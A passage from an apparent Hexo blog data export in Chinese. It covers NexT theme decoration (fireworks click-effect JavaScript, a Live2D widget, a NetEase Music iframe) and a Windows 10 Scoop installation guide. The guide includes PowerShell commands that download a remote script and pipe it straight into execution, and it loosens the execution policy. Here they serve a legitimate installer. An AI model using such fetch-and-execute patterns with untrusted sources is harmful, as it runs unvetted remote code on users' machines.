function_\">random</span>(<span class=\"number\">80</span>,<span class=\"number\">160</span>),<span class=\"attr\">lineWidth</span>:<span class=\"number\">0</span>,<span class=\"attr\">alpha</span>:&#123;<span class=\"attr\">value</span>:<span class=\"number\">0</span>,<span class=\"attr\">easing</span>:<span class=\"string\">&quot;linear&quot;</span>,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">600</span>,<span class=\"number\">800</span>)&#125;,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">1200</span>,<span class=\"number\">1800</span>),<span class=\"attr\">easing</span>:<span class=\"string\">&quot;easeOutExpo&quot;</span>,<span class=\"attr\">update</span>:renderParticule,<span class=\"attr\">offset</span>:<span class=\"number\">0</span>&#125;)&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">debounce</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a;<span class=\"keyword\">return</span> <span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;<span class=\"keyword\">var</span> n=<span class=\"variable language_\">this</span>,i=<span class=\"variable language_\">arguments</span>;<span class=\"built_in\">clearTimeout</span>(a),a=<span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;e.<span class=\"title function_\">apply</span>(n,i)&#125;,t)&#125;&#125;<span class=\"keyword\">var</span> canvasEl=<span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;.fireworks&quot;</span>);<span class=\"keyword\">if</span>(canvasEl)&#123;<span class=\"keyword\">var</span> ctx=canvasEl.<span class=\"title function_\">getContext</span>(<span class=\"string\">&quot;2d&quot;</span>),numberOfParticules=<span class=\"number\">30</span>,pointerX=<span class=\"number\">0</span>,pointerY=<span class=\"number\">0</span>,tap=<span class=\"string\">&quot;mousedown&quot;</span>,colors=[<span class=\"string\">&quot;#FF1461&quot;</span>,<span class=\"string\">&quot;#18FF92&quot;</span>,<span class=\"string\">&quot;#5A87FF&quot;</span>,<span class=\"string\">&quot;#FBF38C&quot;</span>],setCanvasSize=<span class=\"title function_\">debounce</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;canvasEl.<span class=\"property\">width</span>=<span class=\"number\">2</span>*<span class=\"variable language_\">window</span>.<span class=\"property\">innerWidth</span>,canvasEl.<span class=\"property\">height</span>=<span class=\"number\">2</span>*<span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>,canvasEl.<span class=\"property\">style</span>.<span class=\"property\">width</span>=<span class=\"variable language_\">window</span>.<span class=\"property\">innerWidth</span>+<span class=\"string\">&quot;px&quot;</span>,canvasEl.<span class=\"property\">style</span>.<span class=\"property\">height</span>=<span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>+<span class=\"string\">&quot;px&quot;</span>,canvasEl.<span class=\"title function_\">getContext</span>(<span class=\"string\">&quot;2d&quot;</span>).<span class=\"title function_\">scale</span>(<span class=\"number\">2</span>,<span class=\"number\">2</span>)&#125;,<span class=\"number\">500</span>),render=<span class=\"title function_\">anime</span>(&#123;<span class=\"attr\">duration</span>:<span class=\"number\">1</span>/<span class=\"number\">0</span>,<span class=\"attr\">update</span>:<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"title function_\">clearRect</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,canvasEl.<span class=\"property\">width</span>,canvasEl.<span class=\"property\">height</span>)&#125;&#125;);<span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(tap,<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"string\">&quot;sidebar&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">id</span>&amp;&amp;<span class=\"string\">&quot;toggle-sidebar&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">id</span>&amp;&amp;<span class=\"string\">&quot;A&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">nodeName</span>&amp;&amp;<span class=\"string\">&quot;IMG&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">nodeName</span>&amp;&amp;(render.<span class=\"title function_\">play</span>(),<span class=\"title function_\">updateCoords</span>(e),<span class=\"title function_\">animateParticules</span>(pointerX,pointerY))&#125;,!<span class=\"number\">1</span>),<span class=\"title function_\">setCanvasSize</span>(),<span class=\"variable language_\">window</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;resize&quot;</span>,setCanvasSize,!<span class=\"number\">1</span>)&#125;<span class=\"string\">&quot;use strict&quot;</span>;<span class=\"keyword\">function</span> <span class=\"title function_\">updateCoords</span>(<span class=\"params\">e</span>)&#123;pointerX=(e.<span class=\"property\">clientX</span>||e.<span class=\"property\">touches</span>[<span class=\"number\">0</span>].<span class=\"property\">clientX</span>)-canvasEl.<span class=\"title function_\">getBoundingClientRect</span>().<span class=\"property\">left</span>,pointerY=e.<span class=\"property\">clientY</span>||e.<span class=\"property\">touches</span>[<span class=\"number\">0</span>].<span class=\"property\">clientY</span>-canvasEl.<span class=\"title function_\">getBoundingClientRect</span>().<span class=\"property\">top</span>&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">setParticuleDirection</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">var</span> t=anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,<span class=\"number\">360</span>)*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>/<span class=\"number\">180</span>,a=anime.<span class=\"title function_\">random</span>(<span class=\"number\">50</span>,<span class=\"number\">180</span>),n=[-<span class=\"number\">1</span>,<span class=\"number\">1</span>][anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,<span class=\"number\">1</span>)]*a;<span class=\"keyword\">return</span>&#123;<span class=\"attr\">x</span>:e.<span class=\"property\">x</span>+n*<span class=\"title class_\">Math</span>.<span class=\"title function_\">cos</span>(t),<span class=\"attr\">y</span>:e.<span class=\"property\">y</span>+n*<span class=\"title class_\">Math</span>.<span class=\"title function_\">sin</span>(t)&#125;&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">createParticule</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a=&#123;&#125;;<span class=\"keyword\">return</span> a.<span class=\"property\">x</span>=e,a.<span class=\"property\">y</span>=t,a.<span class=\"property\">color</span>=colors[anime.<span class=\"title function_\">random</span>(<span class=\"number\">0</span>,colors.<span class=\"property\">length</span>-<span class=\"number\">1</span>)],a.<span class=\"property\">radius</span>=anime.<span class=\"title function_\">random</span>(<span class=\"number\">16</span>,<span class=\"number\">32</span>),a.<span class=\"property\">endPos</span>=<span class=\"title function_\">setParticuleDirection</span>(a),a.<span class=\"property\">draw</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"title function_\">beginPath</span>(),ctx.<span class=\"title function_\">arc</span>(a.<span class=\"property\">x</span>,a.<span class=\"property\">y</span>,a.<span class=\"property\">radius</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>,!<span class=\"number\">0</span>),ctx.<span class=\"property\">fillStyle</span>=a.<span class=\"property\">color</span>,ctx.<span class=\"title function_\">fill</span>()&#125;,a&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">createCircle</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a=&#123;&#125;;<span class=\"keyword\">return</span> a.<span class=\"property\">x</span>=e,a.<span class=\"property\">y</span>=t,a.<span class=\"property\">color</span>=<span class=\"string\">&quot;#F00&quot;</span>,a.<span class=\"property\">radius</span>=<span class=\"number\">0.1</span>,a.<span class=\"property\">alpha</span>=<span class=\"number\">0.5</span>,a.<span class=\"property\">lineWidth</span>=<span class=\"number\">6</span>,a.<span class=\"property\">draw</span>=<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"property\">globalAlpha</span>=a.<span class=\"property\">alpha</span>,ctx.<span class=\"title function_\">beginPath</span>(),ctx.<span class=\"title function_\">arc</span>(a.<span class=\"property\">x</span>,a.<span class=\"property\">y</span>,a.<span class=\"property\">radius</span>,<span class=\"number\">0</span>,<span class=\"number\">2</span>*<span class=\"title class_\">Math</span>.<span class=\"property\">PI</span>,!<span class=\"number\">0</span>),ctx.<span class=\"property\">lineWidth</span>=a.<span class=\"property\">lineWidth</span>,ctx.<span class=\"property\">strokeStyle</span>=a.<span class=\"property\">color</span>,ctx.<span class=\"title function_\">stroke</span>(),ctx.<span class=\"property\">globalAlpha</span>=<span class=\"number\">1</span>&#125;,a&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">renderParticule</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> t=<span class=\"number\">0</span>;t&lt;e.<span class=\"property\">animatables</span>.<span class=\"property\">length</span>;t++)&#123;e.<span class=\"property\">animatables</span>[t].<span class=\"property\">target</span>.<span class=\"title function_\">draw</span>()&#125;&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">animateParticules</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">for</span>(<span class=\"keyword\">var</span> a=<span class=\"title function_\">createCircle</span>(e,t),n=[],i=<span class=\"number\">0</span>;i&lt;numberOfParticules;i++)&#123;n.<span class=\"title function_\">push</span>(<span class=\"title function_\">createParticule</span>(e,t))&#125;anime.<span class=\"title function_\">timeline</span>().<span class=\"title function_\">add</span>(&#123;<span class=\"attr\">targets</span>:n,<span class=\"attr\">x</span>:<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">return</span> e.<span class=\"property\">endPos</span>.<span class=\"property\">x</span>&#125;,<span class=\"attr\">y</span>:<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"keyword\">return</span> e.<span class=\"property\">endPos</span>.<span class=\"property\">y</span>&#125;,<span class=\"attr\">radius</span>:<span class=\"number\">0.1</span>,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">1200</span>,<span class=\"number\">1800</span>),<span class=\"attr\">easing</span>:<span class=\"string\">&quot;easeOutExpo&quot;</span>,<span class=\"attr\">update</span>:renderParticule&#125;).<span class=\"title function_\">add</span>(&#123;<span class=\"attr\">targets</span>:a,<span class=\"attr\">radius</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">80</span>,<span class=\"number\">160</span>),<span class=\"attr\">lineWidth</span>:<span class=\"number\">0</span>,<span class=\"attr\">alpha</span>:&#123;<span class=\"attr\">value</span>:<span class=\"number\">0</span>,<span class=\"attr\">easing</span>:<span class=\"string\">&quot;linear&quot;</span>,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">600</span>,<span class=\"number\">800</span>)&#125;,<span class=\"attr\">duration</span>:anime.<span class=\"title function_\">random</span>(<span class=\"number\">1200</span>,<span class=\"number\">1800</span>),<span class=\"attr\">easing</span>:<span class=\"string\">&quot;easeOutExpo&quot;</span>,<span class=\"attr\">update</span>:renderParticule,<span class=\"attr\">offset</span>:<span class=\"number\">0</span>&#125;)&#125;<span class=\"keyword\">function</span> <span class=\"title function_\">debounce</span>(<span class=\"params\">e,t</span>)&#123;<span class=\"keyword\">var</span> a;<span class=\"keyword\">return</span> <span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;<span class=\"keyword\">var</span> n=<span class=\"variable language_\">this</span>,i=<span class=\"variable language_\">arguments</span>;<span class=\"built_in\">clearTimeout</span>(a),a=<span class=\"built_in\">setTimeout</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;e.<span class=\"title function_\">apply</span>(n,i)&#125;,t)&#125;&#125;<span class=\"keyword\">var</span> canvasEl=<span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&quot;.fireworks&quot;</span>);<span class=\"keyword\">if</span>(canvasEl)&#123;<span class=\"keyword\">var</span> ctx=canvasEl.<span class=\"title function_\">getContext</span>(<span class=\"string\">&quot;2d&quot;</span>),numberOfParticules=<span class=\"number\">30</span>,pointerX=<span class=\"number\">0</span>,pointerY=<span class=\"number\">0</span>,tap=<span class=\"string\">&quot;mousedown&quot;</span>,colors=[<span class=\"string\">&quot;#FF1461&quot;</span>,<span class=\"string\">&quot;#18FF92&quot;</span>,<span class=\"string\">&quot;#5A87FF&quot;</span>,<span class=\"string\">&quot;#FBF38C&quot;</span>],setCanvasSize=<span class=\"title function_\">debounce</span>(<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;canvasEl.<span class=\"property\">width</span>=<span class=\"number\">2</span>*<span class=\"variable language_\">window</span>.<span class=\"property\">innerWidth</span>,canvasEl.<span class=\"property\">height</span>=<span class=\"number\">2</span>*<span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>,canvasEl.<span class=\"property\">style</span>.<span class=\"property\">width</span>=<span class=\"variable language_\">window</span>.<span class=\"property\">innerWidth</span>+<span class=\"string\">&quot;px&quot;</span>,canvasEl.<span class=\"property\">style</span>.<span class=\"property\">height</span>=<span class=\"variable language_\">window</span>.<span class=\"property\">innerHeight</span>+<span class=\"string\">&quot;px&quot;</span>,canvasEl.<span class=\"title function_\">getContext</span>(<span class=\"string\">&quot;2d&quot;</span>).<span class=\"title function_\">scale</span>(<span class=\"number\">2</span>,<span class=\"number\">2</span>)&#125;,<span class=\"number\">500</span>),render=<span class=\"title function_\">anime</span>(&#123;<span class=\"attr\">duration</span>:<span class=\"number\">1</span>/<span class=\"number\">0</span>,<span class=\"attr\">update</span>:<span class=\"keyword\">function</span>(<span class=\"params\"></span>)&#123;ctx.<span class=\"title function_\">clearRect</span>(<span class=\"number\">0</span>,<span class=\"number\">0</span>,canvasEl.<span class=\"property\">width</span>,canvasEl.<span class=\"property\">height</span>)&#125;&#125;);<span class=\"variable language_\">document</span>.<span class=\"title function_\">addEventListener</span>(tap,<span class=\"keyword\">function</span>(<span class=\"params\">e</span>)&#123;<span class=\"string\">&quot;sidebar&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">id</span>&amp;&amp;<span class=\"string\">&quot;toggle-sidebar&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">id</span>&amp;&amp;<span class=\"string\">&quot;A&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">nodeName</span>&amp;&amp;<span class=\"string\">&quot;IMG&quot;</span>!==e.<span class=\"property\">target</span>.<span class=\"property\">nodeName</span>&amp;&amp;(render.<span class=\"title function_\">play</span>(),<span class=\"title function_\">updateCoords</span>(e),<span class=\"title function_\">animateParticules</span>(pointerX,pointerY))&#125;,!<span class=\"number\">1</span>),<span class=\"title function_\">setCanvasSize</span>(),<span class=\"variable language_\">window</span>.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&quot;resize&quot;</span>,setCanvasSize,!<span class=\"number\">1</span>)&#125;;</span><br></pre></td></tr></table></figure></li>\n<li>在 <code>themes/next/layout/_layout.swig</code> 文件末尾添加：<br><code>javascript &lt;!-- 页面点击小红心 --&gt; &lt;script type=&quot;text/javascript&quot; src=&quot;/js/clicklove.js&quot;&gt;&lt;/script&gt; </code><br>打开 <code>themes/next/_config.yml</code> 文件，在末尾添加如下标识：</li>\n</ul>\n</li>\n</ol>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Fireworks</span></span><br><span class=\"line\"><span class=\"attr\">fireworks:</span> <span class=\"literal\">true</span></span><br></pre></td></tr></table></figure>\n\n<p>重新编译后就有鼠标点击特效啦</p>\n<h1 id=\"添加页面人物\"><a href=\"#添加页面人物\" class=\"headerlink\" title=\"添加页面人物\"></a>添加页面人物</h1><p>在博客目录下执行：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -save hexo-helper-live2d</span><br></pre></td></tr></table></figure>\n\n<p>在 <a href=\"https://github.com/xiazeyu/live2d-widget-models\">lived2d</a>中选择自己想要的人物形象，例子可在作者网站中查看，<a href=\"https://huaji8.top/post/live2d-plugin-2.0/\">Author’s original Blog</a>。下载命令如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install live2d-widget-model-wanko</span><br></pre></td></tr></table></figure>\n\n<p>在 <code>your_blog/_config.yml</code> 或者 <code>themes/next/_config.yml</code> 文件下添加如下配置：</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Live2D</span></span><br><span class=\"line\"><span class=\"comment\">## https://github.com/xiazeyu/live2d-widget.js</span></span><br><span class=\"line\"><span class=\"comment\">## https://l2dwidget.js.org/docs/class/src/index.js~L2Dwidget.html#instance-method-init</span></span><br><span class=\"line\"><span class=\"attr\">live2d:</span></span><br><span class=\"line\">  <span class=\"attr\">enable:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">  <span class=\"attr\">scriptFrom:</span> <span class=\"string\">local</span></span><br><span class=\"line\">  <span class=\"attr\">pluginRootPath:</span> <span class=\"string\">live2dw/</span></span><br><span class=\"line\">  <span class=\"attr\">pluginJsPath:</span> <span class=\"string\">lib/</span></span><br><span class=\"line\">  <span class=\"attr\">pluginModelPath:</span> <span class=\"string\">assets/</span></span><br><span class=\"line\">  <span class=\"attr\">tagMode:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">  <span class=\"attr\">model:</span></span><br><span class=\"line\">    <span class=\"attr\">use:</span> <span class=\"string\">live2d-widget-model-wanko</span> <span class=\"comment\">#选择下载过的模型</span></span><br><span class=\"line\">  <span class=\"attr\">display:</span> <span class=\"comment\">#放置位置和大小</span></span><br><span class=\"line\">    <span class=\"attr\">position:</span> <span class=\"string\">right</span></span><br><span class=\"line\">    <span class=\"attr\">width:</span> <span class=\"number\">150</span></span><br><span class=\"line\">    <span class=\"attr\">height:</span> <span class=\"number\">300</span></span><br><span class=\"line\">  <span class=\"attr\">mobile:</span></span><br><span class=\"line\">    <span class=\"attr\">show:</span> <span class=\"literal\">false</span> <span class=\"comment\">#是否在手机端显示</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"添加网易云音乐播放\"><a href=\"#添加网易云音乐播放\" class=\"headerlink\" title=\"添加网易云音乐播放\"></a>添加网易云音乐播放</h1><p>在<a href=\"https://music.163.com/\">网易云音乐</a>网站搜索自己想添加的音乐，点击生成外链，得到外链 html 代码</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">iframe</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">frameborder</span>=<span class=\"string\">&quot;no&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">border</span>=<span class=\"string\">&quot;0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">marginwidth</span>=<span class=\"string\">&quot;0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">marginheight</span>=<span class=\"string\">&quot;0&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">width</span>=<span class=\"string\">&quot;330&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">height</span>=<span class=\"string\">&quot;86&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">  <span class=\"attr\">src</span>=<span class=\"string\">&quot;//music.163.com/outchain/player?type=2&amp;id=1471724841&amp;auto=1&amp;height=66&quot;</span></span></span><br><span class=\"line\"><span class=\"tag\">&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>将代码放到自己想要的地方就行啦，如放在侧边栏 <code>themes/next/layout/_macro/sidebar.swig</code> 中</p>\n<h1 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h1><ul>\n<li><a href=\"https://blog.csdn.net/mqdxiaoxiao/article/details/93644533\">Hexo 博客 NexT 主题下添加分类、标签、关于菜单项</a></li>\n<li><a href=\"https://blog.csdn.net/nightmare_dimple/article/details/86661502\">Hexo 博客优化之 Next 主题美化</a></li>\n<li><a href=\"http://shenzekun.cn/hexo%E7%9A%84next%E4%B8%BB%E9%A2%98%E4%B8%AA%E6%80%A7%E5%8C%96%E9%85%8D%E7%BD%AE%E6%95%99%E7%A8%8B.html\">hexo 的 next 主题个性化教程:打造炫酷网站</a></li>\n<li><a href=\"https://www.jianshu.com/p/1ff2fcbdd155\">Hexo 博客第三方主题 next 进阶教程</a></li>\n<li><a href=\"https://blog.csdn.net/cungudafa/article/details/104282643\">Hexo（sakura）添加 live2d 看板动画（可对话，换装互动）</a></li>\n<li><a href=\"https://zouhua.top/archives/e635378a.html\">Hexo-Next 主题美化</a></li>\n</ul>"},{"title":"Windows10 安装 Scoop","date":"2021-08-23T13:50:00.000Z","_content":"\nScoop 是可用于 windows 的一款包管理工具，可以下载程序并自动配置环境变量等，记录一下安装方法。\n\n<!--more-->\n\n# 安装条件\n\n- 用户名不含中文字符\n- Windows 7 SP1+ / Windows Server 2008+\n- PowerShell 3+\n- .NET Framework 4.5+\n\n可在 PowerShell 运行以下代码获取版本信息：\n\n```powershell\n#查看Powershell版本\n$PSVersionTable.PSVersion.Major\n#查看.NET Framework版本\n$PSVersionTable.CLRVersion.Major\n```\n\n先输入以下代码，保证后面的脚本有运行权限：\n\n```powershell\nset-executionpolicy remotesigned -scope currentuser\n\n执行策略更改\n执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170\n中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?\n[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): y\n```\n\n# 开始安装\n\n在 PowerShell 输入以下代码下载 Scoop：\n\n```powershell\niwr -useb get.scoop.sh | iex\n# or\niex (new-object net.webclient).downloadstring('https://get.scoop.sh')\n```\n\n## 下载出现错误\n\n1. 若下载中断，重新下载之前请先删除 `C:\\Users\\username\\scoop` 文件夹。\n\n2. 需要安全策略错误，如下所示\n\n```powershell\nPowerShell requires an execution policy in [Unrestricted, RemoteSigned, ByPass] to run Scoop.\nFor example, to set the execution policy to 'RemoteSigned' please run :\n'Set-ExecutionPolicy RemoteSigned -scope CurrentUser'\n```\n\n修改 PowerShell 的安全策略：\n\n```powershell\nSet-ExecutionPolicy RemoteSigned -Scope CurrentUser\n```\n\n3. 无法连接到远程服务器\n\n```powershell\n使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”\n所在位置 行:1 字符: 1\n+ iex (new-object net.webclient).downloadstring('https://get.scoop.sh')\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : WebException\n```\n\n这个错误还有可能出现的 **“基础连接已经关闭：发送时发生错误“** 或 **“操作超时”** ；原因可能是 https://get.scoop.sh 无法访问，或者网络不稳定或者和谐，用以下命令再下载，还是不行的话可多试几次、更换网络或者用梯子\n\n```powershell\niex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/lukesampson/scoop/master/bin/install.ps1')\n```\n\n4. 未能创建 SSL/TLS 安全通道\n\n```powershell\niex : 使用“2”个参数调用“DownloadFile”是发生异常:“请求被中止: 未能创建 SSL/TLS 安全通道。”\n所在位置 行:1 字符: 1\n+ iex (new-object net.webclient).downloadstring('https://get.scoop.sh')\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [Invoke-Expression], MethodInvocationException\n    + FullyQualifiedErrorId : WebException, Microsoft.PowreShell.Commands.InvokeExpressionCommand\n```\n\n执行以下命令：\n\n```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\n```\n\n# 安装成功\n\n输入 `scoop help` 验证是否安装成功。\n\n```powershell\nUsage: scoop <command> [<args>]\n\nSome useful commands are:\n\nalias       Manage scoop aliases\nbucket      Manage Scoop buckets\ncache       Show or clear the download cache\ncheckup     Check for potential problems\ncleanup     Cleanup apps by removing old versions\nconfig      Get or set configuration values\ncreate      Create a custom app manifest\ndepends     List dependencies for an app\nexport      Exports (an importable) list of installed apps\nhelp        Show help for a command\nhome        Opens the app homepage\ninfo        Display information about an app\ninstall     Install apps\nlist        List installed apps\nprefix      Returns the path to the specified app\nreset       Reset an app to resolve conflicts\nsearch      Search available apps\nstatus      Show status and check for new app versions\nuninstall   Uninstall an app\nupdate      Update apps, or Scoop itself\nvirustotal  Look for app's hash on virustotal.com\nwhich       Locate a shim/executable (similar to 'which' on Linux)\n\nType 'scoop help <command>' to get help for a specific command.\n```\n\n常用命令：\n\n```powershell\n# 查找软件\nscoop search apps\n# 下载软件\nscoop install apps\n# 卸载软件\nscoop uninstall apps\n```\n\n# 提升下载速度\n\nscoop 下载软件大多是从外部链接下载的，网速较慢且容易失败，可以安装 aria2 来提升下载速度：\n\n```powershell\nscoop install aria2\n```\n\naria2 安装成功后再下载其他软件时会自动调用进行多线程下载，所以推荐先安装这个软件提升下载体验。\n\n可以设置下载下载线程数（默认为 16 线程）\n\n```powershell\nscoop config aria2-max-connection-per-server 16\nscoop config aria2-split 16\nscoop config aria2-min-split-size 1M\n```\n\n# 添加仓库\n\nscoop 自带的 main bucket 软件过少，我们需要添加官方维护的 extras bucket：\n\n```powershell\nscoop bucket add extras\n```\n\n也可以添加其他的第三方 bucket:\n\n```powershell\nscoop bucket add bucketname bucketaddress\n```\n\n例如添加 scoopbucket 并安装 cajviewer：\n\n```powershell\n# add scoopbucket\nscoop bucket add scoopbucket https://github.com/yuanying1199/scoopbucket\n# install cajviewer\nscoop install scoopbucket/cajviewerlite\n```\n\n# 参考文章\n\n[Scoop 安装详解](https://boyinthesun.cn/post/scoop/)\n\n[scoop——强大的 Windows 命令行包管理工具](https://www.jianshu.com/p/50993df76b1c)\n","source":"_posts/2021/08/Windows安装Scoop.md","raw":"---\ntitle: Windows10 安装 Scoop\ndate: 2021-08-23 21:50:00\ntags:\n  - 配置\n  - Windows\ncategories:\n  - 配置\n  - Windows\n---\n\nScoop 是可用于 windows 的一款包管理工具，可以下载程序并自动配置环境变量等，记录一下安装方法。\n\n<!--more-->\n\n# 安装条件\n\n- 用户名不含中文字符\n- Windows 7 SP1+ / Windows Server 2008+\n- PowerShell 3+\n- .NET Framework 4.5+\n\n可在 PowerShell 运行以下代码获取版本信息：\n\n```powershell\n#查看Powershell版本\n$PSVersionTable.PSVersion.Major\n#查看.NET Framework版本\n$PSVersionTable.CLRVersion.Major\n```\n\n先输入以下代码，保证后面的脚本有运行权限：\n\n```powershell\nset-executionpolicy remotesigned -scope currentuser\n\n执行策略更改\n执行策略可帮助你防止执行不信任的脚本。更改执行策略可能会产生安全风险，如 https:/go.microsoft.com/fwlink/?LinkID=135170\n中的 about_Execution_Policies 帮助主题所述。是否要更改执行策略?\n[Y] 是(Y)  [A] 全是(A)  [N] 否(N)  [L] 全否(L)  [S] 暂停(S)  [?] 帮助 (默认值为“N”): y\n```\n\n# 开始安装\n\n在 PowerShell 输入以下代码下载 Scoop：\n\n```powershell\niwr -useb get.scoop.sh | iex\n# or\niex (new-object net.webclient).downloadstring('https://get.scoop.sh')\n```\n\n## 下载出现错误\n\n1. 若下载中断，重新下载之前请先删除 `C:\\Users\\username\\scoop` 文件夹。\n\n2. 需要安全策略错误，如下所示\n\n```powershell\nPowerShell requires an execution policy in [Unrestricted, RemoteSigned, ByPass] to run Scoop.\nFor example, to set the execution policy to 'RemoteSigned' please run :\n'Set-ExecutionPolicy RemoteSigned -scope CurrentUser'\n```\n\n修改 PowerShell 的安全策略：\n\n```powershell\nSet-ExecutionPolicy RemoteSigned -Scope CurrentUser\n```\n\n3. 无法连接到远程服务器\n\n```powershell\n使用“1”个参数调用“DownloadString”时发生异常:“无法连接到远程服务器”\n所在位置 行:1 字符: 1\n+ iex (new-object net.webclient).downloadstring('https://get.scoop.sh')\n+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : WebException\n```\n\n这个错误还有可能出现的 